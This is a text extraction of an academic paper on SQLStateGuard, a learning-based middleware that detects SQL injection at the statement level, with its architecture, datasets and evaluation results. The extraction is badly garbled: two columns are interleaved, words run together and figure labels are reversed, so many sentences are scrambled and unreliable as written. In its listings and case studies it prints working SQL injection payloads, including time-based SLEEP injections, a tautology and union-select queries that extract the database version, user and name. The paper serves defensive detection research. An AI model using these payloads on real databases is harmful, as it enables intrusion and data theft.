+statementtodistinguishmaliciousSQLstatementsfromnor- parses the syntax of SQL statements, SQLStateGuard can
+malSQLstatements.TheSQLSG-Netconsistsofthreelayers: capturethe appearance ofSQLsyntaxerrorsand helpse-
+Structural Feature Extraction Layer, Semantic Feature Ex- curitypersonnelfindtheattackerandlocatetheinjection
+tractionLayer,andSQLInjectionDetectionLayer. pointbeforeaneffectiveattackoccurs,thusalleviatingthe
+offensiveanddefensiveasymmetryofSQLinjectionattacks
+3.3.1 StructuralFeatureExtractionLayer. ForSQLinjection, andestablishingtheinformationadvantagefortheblueside.
+thecoretechniqueistobreakthestructureoftheSQLstate- SincenormalSQLstatementsdonothavesyntaxerrorsin
+mentoriginallydesignedandexpectedbythedevelopers, thislayer,anabnormalstatementwillbedeterminedifan
+andthedifferenceinstructureisoneofthemaindifferences SQLstatementhasasyntaxerror.
+betweennormalSQLstatementsandmaliciousSQLstate-
+ments. 3.3.2 SemanticFeatureExtractionLayer. Theinputofthis
+layeristext,andtheoutputisasentencevector.TheSQL
+Table1:GeneralizationRules
+statementsaretreatedasanaturallanguagetoextracttheir
+contextualrelationshipsandsemanticfeaturesinthislayer.
+Target GeneralizationResults Then,thegeneralizedSQLstatementsoutputfromtheStruc-
+tural Feature Extraction Layer are vectorized to generate
+ColumnName TK_IDTF
+numericalsentencevectorrepresentationsforsubsequent
+TableName TK_IDTF
+SQLinjectiondetection.AfterobtainingthegeneralizedSQL
+NumericalValue 0
+statementsfromtheStructuralFeatureExtractionLayer,the
+String TK_STR
+semantic feature extraction layer performs segmentation
+Function TK_F
+andencodingtogetthesubscriptsequenceoftheSQLstate-
+System/UserVariable TK_VAR
+ments, which is illustrated in Figure 4. The "subscript se-
+Alias TK_IDTF
+quence"referstothesequencenumberofaparticularword
+Comment TK_C
+inapre-setvocabulary.Inthispaper,weuseAlbertTokenizer
+providedbyTransformer[37]open-sourceprojecttodothis
+Theinputofthislayerisoriginaltext,andtheoutputispro- part,whichisbasedonSentencePiece[22].
+cessedtext.ThislayergeneralizesthecomponentsoftheSQL Afterobtainingthesubscriptsequence,thislayerusesthe
+statement,eliminatesredundantinformation,andpreserves Albert[23]modeltogenerateasentencevector.Bert[21]
+the structural features of the SQL statement, thus laying isawidelyusedpre-trainingmodelinNLP,whichisbased
+thefoundationforthesubsequentsemanticanalysis.This onTransformerandperformswellonarangeofsemantic
+layerstartswiththeconstructionofanAbstractSyntaxTree understandingtasks.AlbertisavariantoftheBert,which
+(AST)fortheSQLstatement,whichisimplementedusingthe reducesthenumberofparametersbyweightsharingandma-
+Go-basedSQLsyntaxparserprovidedbyPingCAP[31],and trixdecompositiontoreduceparameterdata,thusdecreasing
+Figure3showsanSQLstatementandtheASTcorresponding spatialcomplexity.Thislayertakestheencodedsubscript
+
+SoCC’24,November20–22,2024,Redmond,WA,USA Liuetal.
+krowteN
+noitceteD
+noitcejnI
+LQS
+leveL-tnemetatS
+erutaeF
+lartcurtS
+erutaeF
+citnameS
+noitcejnI
+LQS
+tupnI
+reyaL
+noitcartxE
+reyaL
+noitcartxE
+reyaL
+noitceteD
+SQL Statement
+Generalization
+Abstract Column Name,
+Generalized Text
+Syntax Tree Table Name
+Albert
+Sentence Subscripts
+Vector Sequence Segmentation
+Normal
+Malicious
+Detection Network
+Figure2:SQLSG-NetStructure
+Figure4:SegmentationandEncodingExample
+Figure3:ASTConstruction
+3.3.3 SQLInjectionDetectionLayer. Thislayerisbasedon
+GatedLinearUnit(GLU).Itsinputisthesentencevectorfrom
+theSemanticFeatureExtractionLayer,anditsoutputisthe
+sequenceastheinputoftheAlbertmodelandobtainsits multi-classifiedSQLinjectiondetectionresult.Itsstructure
+sentencevectoroutput.Albertprovidesfourdifferentsizes isshowninFigure5.IntroducingGLUforthislayerhelps
+ofpre-trainedmodels,andthislayerusesthemostminia- thenetworkfocusonkeyinformationandstructuresand
+ture scale model, Albert-Base, which has only 12 million thusachievefine-grainedSQLinjectiondetection.Please
+parametersand768hiddenunits. notethatthemodelsinthislayeraredatabase-oriented,
+
+SQLStateGuard:Statement-LevelSQLInjectionDefenseBasedonLearning-DrivenMiddleware SoCC’24,November20–22,2024,Redmond,WA,USA
+In Eq. 7, 𝐼𝑛𝑝𝑢𝑡 is the input vector of Dense,𝑊𝑒𝑖𝑔ℎ𝑡 is
+Input
+theweightmatrix,𝐵𝑖𝑎𝑠 isthebiasmatrix,and𝐴𝑐𝑡𝑖𝑣𝑎𝑡𝑖𝑜𝑛is
+Sentence theactivationfunction.ThemainworkofDenseistomap
+Vector
+the GLU Layer output feature vector to the output space
+byanonlineartransformationbasedonthefullyconnected
+Normalized
+Vector structure:
+Dense
+Layer 𝑍 =𝑊 𝑚×𝑛 ·𝑋 𝑛×𝑑 +𝐵 𝑚×𝑑 (8)
+InEq.8,𝑚 isthenumberofneuronsofDense,𝑑 isthe
+Repeat
+dimensionalityoftheinputvector,and𝑛isthenumberof
+GLU 2 times samples.The𝑊 𝑚∗𝑛 istheweightmatrix,𝑋 𝑛∗𝑑 isthematrix
+Layer composedofsamples,and𝐵 𝑚∗𝑑 isthebiasmatrix.Finally,
+SoftmaxmapstheoutputofDensetoaprobabilitydistribu-
+tion:
+Dense 𝑒𝑧𝑖
+Layer 𝑆𝑜𝑓𝑡𝑚𝑎𝑥(𝑧 𝑖) =
+(cid:205)𝑚
+𝑖=1
+𝑒𝑧𝑖
+(9)
+S L of a t y m e a r x Where 𝑧 𝑖 is the i-th input value, the probability of the
+samplebelongingtoeachcategoryisobtainedbySoftmax,
+Output andthecategorywiththehighestprobabilityisusedasthe
+resultofSQLinjectiondetection.
+Figure5:SQLInjectionDetectionNetworkBasedon
+GLU 3.4 DatasetGenerationProcessfor
+SQLStateGuard
+meaningmultipledetectionmodelsaretrainedfordif- Evenexperiencedsecurityexpertscannottellifastatement
+ferentdatabases.Next,weintroducethecomputationpro- isanSQLinjectionwithoutunderstandingthecodeimple-
+cessofGLUusedinthislayer.Wedenotethesentencevector mentation.Itdirectlyleadstothelackofstatement-levelSQL
+inputtothislayeras𝑋: injectiondatasets,makingstatement-levelSQLinjectionde-
+tectionchallengingtoimplement.Thispartshowshowto
+𝑋 = {𝑋
+1
+,𝑋
+2
+,...,𝑋 𝑛} (1) generatestatement-leveldatasetsforthedatabasesthatneed
+tobeprotectedbySQLStateGuard.
+Then,normalizetheinputsentencevector:
+SQLStateGuardrequiresbothnormalandmalicioussam-
+𝑥 −𝐸(𝑥) plesfortraining.Togeneratethesesamples,thedatasetgen-
+𝑁 = ∗𝛾 +𝛽, 𝑓𝑜𝑟 𝑥𝑖𝑛𝑋 (2)
+√︁ Var[𝑥]+𝜖 erationprocessproposedinthispapercanbebrieflydivided
+intothreesteps:injectionpayloadcollection,templatestate-
+Next,usetheDenselayertoprocessthenormalizeddata.
+mentcollection,andstatementsplicing.
+𝐷 =𝑊 𝑁 +𝑏 (3)
+0
+Then,usetheGLUlayertoprocesstheoutputoftheDense
+layer.
+𝐴=𝐸×𝑊 +𝑏 (4)
+𝐵 =𝐸×𝑉 +𝑐 (5)
+𝐻 =𝐴⊗𝜎(𝐵) (6)
+0
+Inthislayer,thesentencevectoroftheinputSQLstate- Figure6:TemplateStatementCollection
+mentisprocessedbytheGLU-basednetwork,andDenseand
+Softmaxobtainthefinalclassificationprobabilityoutput:
+We first need to complete the injection payload collec-
+tion.Sincetherearemanypayload-levelSQLinjectionde-
+𝑂𝑢𝑡𝑝𝑢𝑡 =𝐴𝑐𝑡𝑖𝑣𝑎𝑡𝑖𝑜𝑛((𝐼𝑛𝑝𝑢𝑡 ·𝑊𝑒𝑖𝑔ℎ𝑡)+𝐵𝑖𝑎𝑠) (7) tectionstudiesandtherelateddatasetsarerich,thispaper
+
+SoCC’24,November20–22,2024,Redmond,WA,USA Liuetal.
+collectspayloadsfromexistingpublicdatasetssuchasData- Table 2: Details of Statement-Level SQL Injection
+Hacking[34]andLibInjection[13].Inaddition,wealsocol- Datasets
+lectthepayloadsusedbyautomatedtestingtoolssuchas
+SqlMap[5].Then,weconducttemplatestatementcollection, Dataset DatasetID Type Count
+astepthatisalsodonebasedonmiddleware.Asshownin Malicious 74,555
+Self-Built I
+Figure6,wecollecttheSQLstatementsgeneratedbyper- Normal 75,000
+formingfunctionaltestsaftersettingupmiddlewarebetween Malicious 71,757
+WordPress II
+theapplicationandthedatabase.Thesestatementsareboth Normal 79,316
+normalsamplesinthedatasetandtemplatestatementsused
+toconstructmalicioussamples. Table3:DetailsofMaliciousStatement-LevelSQLIn-
+jectionDatasets
+DetailType DatasetI DatasetII
+Time-based 1,588 1,392
+Boolean-based 2,196 2,012
+Error-based 3,491 3,206
+Tautology-based 9,135 8,359
+Union-based 58,145 56,788
+Thedetailsofthestatement-levelSQLinjectiondatasets
+Figure7:Payload-to-TemplateSplicing usedinthispaperareshowninTable2andTable3,which
+come from a self-built Web application (Dataset I) and a
+WordPress[38]instance(DatasetII),respectively.Theself-
+Finally, we splice the payloads into the template state-
+builtWebapplicationisanApplicationProgrammingInter-
+mentsandlabeltheoutputstatementsasmalicioussamples.
+face(API)gatewaybasedonSanicFramework[33].Word-
+Figure 7 is an example of this process. In principle, SQL-
+Pressisthemostwidelyusedopen-sourcecontentmanage-
+StateGuardaccomplishesinjectiondetectionbydetermining
+mentsystemintheworld.ThetotalcountofSQLstatements
+whether the statement to be tested is "abnormal" or not.
+inthetwodatasetsexceeds300,000.
+Therefore, this dataset generation process is the basis of
+SQLStateGuard.
+Table4:DetailsofHTTPRequestDataset
+4 EXPERIMENTS
+Dataset DatasetID MainLabel Count
+Thispaperusesdifferentdatasetsandthefollowingquestions
+toevaluateSQLStateGuard: Malicious 22,334
+Self-Built III
+Normal 22,534
+• RQ1:CanSQLStateGuardeffectivelydetectSQLinjec-
+tionsagainstdatabaseservices? Malicious 13,421
+WordPress IV
+• RQ2:IsSQLSG-NetbasedonGLUnetworkbetterthan Normal 13,335
+otherimplementations?
+• RQ3:IsthedetectioncostofSQLStateGuardaccept- TheHTTPrequestdatasetsbasedonthestatement-level
+ableinreal-worldenvironments? SQLinjectiondatasetsaresimilarlydividedintoDatasetIII
+• RQ4:IsSQLStateGuardbetterthanexistingSQLin- (self-builtWebapplication)andDatasetIV(WordPress).The
+jectiondetectionapproaches? detailsofthesetwodatasetsareshowninTable4.Sincethe
+application processingof anHTTP requestmay generate
+4.1 Datasets
+multipleSQLstatements,thenumberofsamplesintheHTTP
+Thispaperusestwostatement-levelSQLinjectiondatasets requestdatasetandthestatement-levelSQLinjectiondataset
+generatedbytheprocessinSection3.4andtwoHTTP isdifferent.
+requestdatasetsconstructedbasedonthem.Thestatement- Pleasenotethatsincesomeabnormalsamplesareinjected
+levelSQLdatasetisusedtotrainandevaluatetheSQLSG-Net basedonsyntaxerrors,theyareblockedatthestructural
+inSQLStateGuard,whiletheHTTPrequestdatasetisusedto featureextractionlayer.So,forRQ1,2,and3,thedataset
+compareSQLStateGuardandothertraffic-basedapproaches isallSQLstatementsthatpassthroughthestructuralfea-
+inaside-by-sidemanner. tureextractionlayer.Therelationshipbetweentheoriginal
+
+SQLStateGuard:Statement-LevelSQLInjectionDefenseBasedonLearning-DrivenMiddleware SoCC’24,November20–22,2024,Redmond,WA,USA
+datasetandthedatasetthatpassesthroughthestructural Thebinaryclassificationevaluationonlydistinguishesbe-
+featureextractionlayerisshowninTable5. tweennormalandmalicious,whichmainlyshowstheper-
+formanceofSQLSG-NettodetectSQLinjections.Themulti-
+4.2 Implementation,Setup,andMetrics classificationevaluationismorefine-grainedandevaluates
+SQLStateGuard’sabilitytodistinguishdifferentSQLinjec-
+Intermsofthehardwareenvironment,weuseaGPUserver
+tiontypes,andbetterdifferentiationmeansthatSQLState-
+(NVIDIARTXA6000)tocompletethetrainingandevaluation
+Guardcanprovidemoreinformationtosecurityoperators
+ofSQLStateGuard.Intermsofsoftwareimplementation,this
+andhelpthemlocateandanalyzesecuritythreats.
+paper implements a prototype system of SQLStateGuard
+Then,weuseDatasetIItoperformtrainingevaluationon
+basedonPython[32]3.8.5,andotherapproachesinvolved
+SQLSG-Net.ComparedwithDatasetI,thecontent-driven
+intheexperimentscomefromtheirofficialimplementations
+DatasetIIismorecomplexandhasagreatervarietyofSQL
+ortheimplementationsprovidedbytheauthors.
+statementstructures.Herearetwoinjectedstatementsof
+WeuseAccuracy,Recall,Precision,F1-Score,andFalsePos-
+itiveRate(𝐹𝑃𝑅 = 𝐹𝑃 )toevaluateSQLStateGuard.Con- the same type, and we can see that the structures of the
+𝑇𝑁+𝐹𝑃
+statements in Dataset II are more complex than those in
+sidering the unbalanced datasets used in evaluating SQL-
+DatasetI:
+StateGuard,wewilluseweightedmetricstocompletethe
+multi-classificationevaluationofSQLStateGuard.Inthispa-
+Listing1:ExamplesofMaliciousStatementsinDataset
+per,theweightofeachclassificationisdefinedasthepro-
+IandDatasetII
+portion of samples in the total sample and is denoted as
+𝑊 𝑖 = (cid:205) (cid:205) 𝑖 (cid:205) 𝑖 𝐶 𝑗 𝑖 𝐶 ,𝑗 𝑖,𝑗 . Then, we calculate the metrics in a multi- A se T le i c m t e- u b s a e s r e _ d id In , je p c a t s io sw n o in rd D f a ro ta m se i t n I fo.users where
+classificationscenariobyweightingtheaverageforamore
+username='admin'; select sleep(5);−− '
+fine-grainedevaluationofSQLStateGuard.Wehave:
+∑︁
+𝐴𝑐𝑐𝑢𝑟𝑎𝑐𝑦 𝑎𝑣𝑔 = 𝑊 𝑖 ∗𝐴𝑐𝑐𝑢𝑟𝑎𝑐𝑦 𝑖 (10) ATime-basedInjectioninDatasetII
+𝑖 SELECTSQL_CALC_FOUND_ROWSwp_posts.IDFROM
+wp_postsWHERE1=1ANDwp_posts.post_type='
+∑︁
+𝑃𝑟𝑒𝑐𝑖𝑠𝑖𝑜𝑛 𝑎𝑣𝑔 = 𝑊 𝑖 ∗𝑃𝑟𝑒𝑐𝑖𝑠𝑖𝑜𝑛 𝑖 (11) wp_block'AND((wp_posts.post_status='publish'));
+𝑖 SELECTSLEEP(5)−−'))ORDERBYwp_posts.
+𝑅𝑒𝑐𝑎𝑙𝑙 𝑎𝑣𝑔 = ∑︁ 𝑊 𝑖 ∗𝑅𝑒𝑐𝑎𝑙𝑙 𝑖 (12) post_dateDESCLIMIT0,100
+𝑖
+AfterthetrainingbasedonDatasetIIiscompleted,we
+∑︁
+𝐹1−𝑆𝑐𝑜𝑟𝑒 𝑎𝑣𝑔 = 𝑊 𝑖 ∗𝐹1−𝑆𝑐𝑜𝑟𝑒 𝑖 (13) use the test set divided from Dataset II to evaluate SQL-
+𝑖 StateGuard,andtheresultsareshowninTable7.Wecan
+seethatSQLStateGuardalsoworkswellonDatasetII,but
+4.3 TrainingandDetectionPerformance
+thecomplexityanddiversityslightlydegradethedetection
+(RQ1)
+performance.
+ToanswerRQ1,twostatement-levelSQLinjectiondatasets Insummary,thisexperimentgivesaprettysatisfactory
+(DatasetIandDatasetII)areusedtotrainSQLSG-Net.In answertoRQ1.SQLStateGuardhasexcellentSQLinjection
+thisexperiment,theSQLstatementsinthedatasetarefirstly detectioncapabilityandcanaccuratelyidentifythetypeof
+convertedintosentencevectorsbytheStructuralFeatureEx- SQLinjections,thushelpingsecuritypersonnellocateand
+tractionLayerandtheSemanticFeatureExtractionLayerin analyzesecuritythreats.
+SQLSG-Netwhilepreservingthelabels.Then,thesesentence CaseStudyI:Theresultsshowthattheoverallperfor-
+vectorsandtheirlabelsareusedtotraintheSQLinjection manceofthemulti-classificationevaluationisreducedcom-
+detectionmodelsbasedonGLU. paredtothebinary-classificationevaluation.Afteranalyzing
+In this experiment, we divide the training set, test set, eachcategoryinthedatasets,wefoundthatsomemalicious
+andvalidationsetaccordingtotheratioof6:2:2.First,we samplessufferedfrommultipletypesofSQLinjections,such
+useDatasetIforthetrainingevaluationofSQLSG-Net,de- as the payload "admin’ AND SLEEP(5) AND ’fhez’=’fhez",
+rivedfromaself-builtWebapplicationtoevaluatetheSQL whichcombinesbothtime-blindandtautology-basedSQL
+injectiondetectionperformanceforAPIs. injections.However,thesesamplesareonlyclassifiedinto
+After the training based on Dataset I is completed, the asinglecategoryinthedatasets,sothemodelmaypredict
+performanceofSQLinjectiondetectionisevaluatedbased themasinconsistentwiththetaggedlabels.
+onbinaryclassificationandmulti-classificationcriteriaus- CaseStudyII:ThefollowingtwoSQLstatementsillus-
+ingthetestsetdividedfromDatasetI,asshowninTable6. trateexamplesofthosecapturedandmissedbyoursystem.
+
+SoCC’24,November20–22,2024,Redmond,WA,USA Liuetal.
+Table5:TheRelationshipbetweentheOriginalDatasetandtheDatasetthatPassesthroughtheStructuralFeature
+ExtractionLayer
+Original StructuralFeatureExtraction
+Normal Malicious Normal Malicious
+DatasetI 75,000 74,555 75,000 74,555
+DatasetII 79,316 71,757 79,316 64,541
+Table6:DetectionEvaluationonTestSetofDatasetI
+Type Accuracy Recall Precision F1-Score FPR
+Binary 100.00% 100.00% 100.00% 100.00% 0.00%
+Multiple 99.05% 98.58% 97.43% 97.98% N/A
+*Multi-classificationmetricsareweightedaverages
+Table7:DetectionEvaluationonTestSetofDatasetII
+Type Accuracy Recall Precision F1-Score FPR
+Binary 99.97% 99.95% 99.98% 99.97% >0.00%
+Multiple 98.93% 95.06% 96.06% 95.55% N/A
+*Multi-classificationmetricsareweightedaverages
+Webelievethefirststatement,whichwasnotcaptured,con- 4.4 ImplementationComparisonof
+tainsalargenumberofqueryunits,whichlikelyobscuredits SQLSG-Net(RQ2)
+maliciouscharacteristics.Incontrast,thesecondstatement,
+ThisexperimentfocusesonverifyingwhetherSQLSG-Net’s
+withfewerqueryunits,waseasilydetectedbyoursystem.
+implementationbasedonGLUhasacomparativeadvantage
+However,caseslikethefirststatement,wherethesystem
+overothersolutions.Inthisexperiment,weusedetection
+failstocaptureit,areextremelyrare(only6indatasetsIand
+modelsfromotherlearning-basedtechniquestoreplacethe
+II),andthuswebelievetheyhaveminimalimpactonour
+SQLInjectionDetectionLayerinSQLSG-Netandthencom-
+system’soverallperformance.
+parethedetectioneffectivenessofthedifferentimplementa-
+Listing2:ExamplesofMaliciousStatementsinDataset tions.Therearetwootherlearning-basedmodelsinvolved
+IandDatasetII inthisexperiment:SVM[9]andLSTM[16].
+The results of this experiment are shown in Table 8. It
+AnMaliciousSQLSystemdidn’tCaught
+isobviousfromthetablethatSVMhaspoorperformance,
+SELECTCOUNT(∗)FROMwp_term_relationships,
+especiallyitsfalsepositiverate,whichmakesSQLinjection
+wp_postsWHEREwp_posts.ID=
+blockingimpractical.Theoverallperformanceofthemodels
+wp_term_relationships.object_idANDpost_statusIN
+onDatasetIIisslightlyworsethanthatofDatasetI,espe-
+('publish')ANDpost_typeIN ('post') AND
+ciallywhenperformingthemulti-classificationevaluation,
+term_taxonomy_id=1and1=0unionselect 1,
+mainlybecauseWordPressgeneratesawidervarietyofSQL
+concat_ws(0x3a,version(),user(),database())
+statementtypesthanself-builtwebapplications.
+,3,4,5,6,7,8,9,10,11,12−−
+Besides,wecanseetheperformanceofLSTMispretty
+good, though still inferior to the GLU network used by
+AnMaliciousSQLSystemCaught
+SQLSG-Net.Itisanexcellentexampleoftheeffectiveness
+SELECTmeta_idFROMwp_postmetaWHEREmeta_key
+of SQLStateGuard’s architecture and feature engineering
+='_edit_lock'ANDpost_id=1and1=0unionselect
+design.Finally,SQLSG-Nethasthebestperformanceinall
+1,2,3,concat_ws(0x3a,version(),user(),database())
+evaluationmetrics,demonstratingthecomparativeadvan-
+,5−−
+tageofitsimplementationoverothersolutions.
+
+SQLStateGuard:Statement-LevelSQLInjectionDefenseBasedonLearning-DrivenMiddleware SoCC’24,November20–22,2024,Redmond,WA,USA
+Table8:DetectionLayerEvaluationonDatasetIandDatasetII
+Implementation Dataset ClassificationType Accuracy Recall Precision F1-Score FPR
+Binary 99.92% 99.84% 100.00% 99.92% 0.00%
+I
+Multiple 97.26% 77.22% 88.94% 81.16% N/A
+SVM
+Binary 97.81% 99.68% 95.87% 97.74% 3.89%
+II
+Multiple 96.27% 65.71% 86.43% 67.74% N/A
+Binary 99.99% 100.00% 99.97% 99.99% >0.00%
+I
+Multiple 98.37% 89.60% 91.76% 90.61% N/A
+LSTM
+Binary 99.95% 99.81% 99.92% 99.94% >0.00%
+II
+Multiple 97.77% 80.53% 89.51% 83.61% N/A
+Binary 100.00% 100.00% 100.00% 100.00% 0.00%
+I
+Multiple 99.05% 98.58% 97.43% 97.98% N/A
+SQLSG-Net
+Binary 99.97% 99.95% 99.98% 99.97% >0.00%
+II
+Multiple 98.93% 95.06% 96.06% 95.55% N/A
+*Multi-classificationmetricsareweightedaverages
+4.5 CostEvaluation(RQ3) IV)tocompletethisexperimentandperformasystem-level
+ThisexperimentisdesignedtoanswerRQ3.Thepresence evaluationbasedonbinary-classificationmetrics.
+of additional security detection will inevitably lead to in- Inthisexperiment,wefirstparsetheHTTPrequestsin
+creasedlatency,andwhethertheseadditionallatencieswill DatasetIIIandDatasetIVintothelogformatsrequiredby
+seriouslyinterferewiththeuseofdatabaseservicesbyback- thesetwoapproachesandrespectivelyevaluatetheirperfor-
+end programs is one of the critical questions of whether mance.TheSQLStateGuardproposedinthispaperworks
+SQLStateGuard can be deployed in the real world. In this at the statement level, and usually an HTTP request con-
+experiment,wecombineDatasetIandDatasetIIintoone tainsmorethanoneSQLstatement,whichmeansthatfora
+andevaluatethedetectiontimeoverheadofSQLStateGuard, maliciousrequest,aslongasanyofitscorrespondingstate-
+andtheresultsareshowninTable9. mentsisdeterminedtobemalicious,theHTTPrequestis
+ThefeatureextractionlayersofSQLSG-Netmainlycause malicious,whichgreatlyincreasesthesuccessrateofSQL-
+theoverheadofSQLStateGuard.Theadditionaltimeover- StateGuard’s judgment. If the back-end application sends
+headof10.499𝑚𝑠 forasingleSQLstatementcansatisfythe anSQLstatementtothedatabaseservicewhileprocessing
+needforSQLinjectionblockinginmostapplicationscenar- anHTTPrequest,SQLStateGuardwillrecordandanalyze
+ios.However,ifasingleapplicationinterfacecallcontains thisstatement.Theresultsofthisexperimentareshownin
+manySQLstatements,SQLStateGuardmayslowdownthe Table10.
+resultreturnspeed.Therefore,thispaperdesignsaBypass Theresultsshowthatthefalsepositiveisthemostcritical
+ModetoprovideSQLinjectiondetectionforlatency-sensitive weaknessofexistingapproaches.Byanalyzingtheirfalse
+scenarios. positivesamples,wefoundthatLuoetal.labeledunfamiliar
+words(e.g.,usernamesnotinthecorpus)maliciousdueto
+thelimitedgeneralizationability.Atthesametime,bothLuo
+4.6 System-LevelComparativeEvaluation etal.andYongetal.havedifficultycopingwiththecomplex
+(RQ4) trafficvariation.Itispronetofalsepositiveswhendetecting
+samples containing special characters and long strings of
+ToanswerRQ4,twoexistingapproaches,Luoetal.[28]and
+numbersandletters.
+Yongetal.[43],areselectedforcomparisonwithSQLState-
+Overall, compared with existing approaches, SQLState-
+Guardinthisexperiment.Thefirstapproachisbasedonlog
+GuardhassignificantadvantagesinallmetricsofSQLinjec-
+analysisandCNN.Thesecondisamalicioustrafficdetection
+tiondetection,includingDatasetIVwithrelativelycomplex
+approachbasedonHiddenMarkovModel(HMM).
+samples,whichanswersRQ4verywell.
+SincebothofthemanalyzesamplesattheHTTPtraffic
+level,andtheanalysisresultsareonlynormalandmalicious,
+weusetwoHTTPrequestdatasets(DatasetIIIandDataset
+
+SoCC’24,November20–22,2024,Redmond,WA,USA Liuetal.
+Table9:AverageTimeOverheadofSingle-StatementDetection
+Working SQL SQLSG-Net
+Total
+Mode Middleware
+Structural Semantic Detection
+Bypass 0.31ms 0 0 0 0.31ms
+Blocking 0.31ms 0.37ms 9.97ms 0.16ms 10.50ms
+Table10:ComparisonEvaluationResults
+Luoetal. Yongetal. Ours
+Dataset III IV III IV III IV
+Accuracy 88.68% 86.43% 98.46% 93.35% 100.00% 100.00%
+Recall 88.68% 86.43% 98.46% 93.35% 100.00% 100.00%
+Precision 89.15% 87.25% 98.51% 93.59% 99.99% 100.00%
+F1-Score 88.65% 86.35% 98.46% 93.34% 100.00% 100.00%
+FPR 16.70% 21.10% 0.00% 10.41% >0.00% 0.00%
+5 DISCUSSION nottoblocktheattack,butforquickwarning,thelatency
+of0.3msinthismodeisacceptableinmostofthesituations.
+5.1 WeaknessofSQLStateGuard
+However,iftheserviceisstillveryperformancesensitiveor
+ExperimentsshowthattheSQLStateGuardproposedinthis
+therearehugeamountofrequests,wecandeployoursolu-
+paperissignificantlybetteratdetectingSQLinjectionsthan
+tionusing,forexample,portmirroring,whichcaneliminate
+existingapproaches,makingitseemtohaveasevereoverfit-
+thelatency.
+tingrisk-butthisisnotthecase.SQLStateGuardisnotthe
+endofthestory,anditsimpressivedetectionperformanceis
+5.2 FutureImprovements
+mainlyduetotwofactors:
+First, SQLStateGuard needs to train different detection Inthefuture,wewillmainlyimproveSQLStateGuardintwo
+modelsfordifferentdatabases.Thisdesignsignificantlyre- aspects.First,wewillreducethenumberofmodelsasmuch
+ducesthevariationofnormalstatements,thusmakingmali- as possible so that each model can serve more databases,
+ciousSQLstatementsmoreprominent.Ontheotherhand, thusreducingmodeltraininganddeploymentcosts.Second,
+it also increases the deployment costs, making SQLState- we will improve the feature engineering process of SQL-
+Guard very challenging in protecting the applications de- StateGuardandshortenthefeatureextractiontimesothat
+signedonnewagiledevelopmentmodelssuchasDevOps. SQLStateGuardcanruninBlockingModemoreoftenand
+Therefore,SQLStateGuardonlysuitstheservicesprovided achievebetterSQLinjectionprotection.
+bytraditionalorganizations(e.g.,government),whichare Inaddition,wewillalsotrytoimprovetheadaptability
+always data-rich and security-critical but have very little ofSQLStateGuardtocodechangesbyintroducinganovel
+codechangeafterdeployment. scoringmechanismtoreducethenumberofretrainingwhile
+Second,SQLStateGuardsimultaneouslyusesdifferentdi- ensuringlowFPR,thusmeetingtheneedsofemergingsoft-
+mensionsofSQLstatementinformationforfeatureextrac- wareengineeringmodelslikeDevOps.
+tion.CombinedwithaGLU-basednetwork,tinydifferences
+betweenthenormalandtheinjectedstatementscanbeef-
+6 CONCLUSION
+fectivelyfound.However,thisdesignalsoincreasesthetime
+overhead,whichaffectsthereal-timeperformanceofSQL- Inthispaper,weproposeSQLStateGuard,anovelstatement-
+StateGuard. levelSQLinjectiondetectionapproach.SQLStateGuardis
+Inthecurrentcontextofthepopularityofcloudcomput- based on the idea of RASP, incorporates middleware into
+ing,theremaybesomanyrequestsforaccesstoaparticular the database service process, and implements statement-
+servicethateachrequestneedstoberespondedtowithvery levelSQLinjectiondetectionbasedonGLU.Itisprovedthat
+lowlatency.Forthissituation,wedesignedbypassmodefor SQLStateGuardcanaccuratelydetectSQLinjectionswith
+performancesensitivesituation,inthismodeourpurposeis averylowFPRcomparedtoexistingapproachesandeven
+identifythetacticaltypesofSQLinjectionsquiteaccurately.
+
+SQLStateGuard:Statement-LevelSQLInjectionDefenseBasedonLearning-DrivenMiddleware SoCC’24,November20–22,2024,Redmond,WA,USA
+SQLStateGuard’s SQL injection detection capabilities are [17] WeizheHua,ZihangDai,HanxiaoLiu,andQuocLe.2022.Transformer
+overwhelminglysuperiortoexistingapproaches. qualityinlineartime.InInternationalconferenceonmachinelearning.
+PMLR,9099–9117.
+ACKNOWLEDGMENTS [18] AnamikaJoshiandVGeetha.2014. SQLInjectiondetectionusing
+machinelearning.In2014internationalconferenceoncontrol,instru-
+ThisworkissupportedbyHY-ProjectunderNo.4E49EFF3, mentation,communicationandcomputationaltechnologies(ICCICCT).
+theGansuProvinceKeyResearchandDevelopmentPlan- IEEE,1111–1115.
+IndustrialProjectunderGrantNo.22YF7GA004,andSuper- [19] MeiJunjin.2009.AnApproachforSQLInjectionVulnerabilityDetec-
+tion. 2009SixthInternationalConferenceonInformationTechnology:
+computingCenterofLanzhouUniversity.
+NewGenerations(2009),1411–1414.
+[20] KonstantinosKemalisandTheodoresTzouramanis.2008.SQL-IDS:a
+REFERENCES
+specification-basedapproachforSQL-injectiondetection.InProceed-
+[1] StanislavAbaimovandGiuseppeBianchi.2019. CODDLE:Code- ingsofthe2008ACMsymposiumonAppliedcomputing.2153–2158.
+InjectionDetectionWithDeepLearning.IEEEAccess7(2019),128617– [21] JacobDevlinMing-WeiChangKentonandLeeKristinaToutanova.
+128627. https://doi.org/10.1109/ACCESS.2019.2939870 2019. Bert:Pre-trainingofdeepbidirectionaltransformersforlan-
+[2] EdwardAmoroso.2018. Recentprogressinsoftwaresecurity. IEEE guageunderstanding.InProceedingsofnaacL-HLT,Vol.1.Minneapolis,
+Software35,2(2018),11–13. Minnesota,2.
+[3] NunoAntunesandMarcoVieira.2010.Benchmarkingvulnerability [22] TakuKudoandJohnRichardson.2018.Sentencepiece:Asimpleand
+detectiontoolsforwebservices.In2010IEEEInternationalConference languageindependentsubwordtokenizeranddetokenizerforneural
+onWebServices.IEEE,203–210. textprocessing.arXivpreprintarXiv:1808.06226(2018).
+[4] MatthewBach-Nutman.2020. Understandingthetop10owaspvul- [23] ZhenzhongLan,MingdaChen,SebastianGoodman,KevinGimpel,
+nerabilities.arXivpreprintarXiv:2012.09960(2020). Piyush Sharma, and Radu Soricut. 2019. Albert: A lite bert for
+[5] Miroslav Stampar Bernardo Damele Assumpcao Guimaraes. 2016. self-supervisedlearningoflanguagerepresentations.arXivpreprint
+SQLMAP. https://sqlmap.org/ arXiv:1909.11942(2019).
+[6] PrithviBisht,P.Madhusudan,andV.N.Venkatakrishnan.2010.CAN- [24] Q.Li,W.Li,J.Wang,andM.Cheng.2019.ASQLInjectionDetection
+DID:DynamiccandidateevaluationsforautomaticpreventionofSQL MethodbasedonAdaptiveDeepForest. IEEEAccessPP,99(2019),
+injectionattacks.AcmTransactionsonInformation&SystemSecurity 1–1.
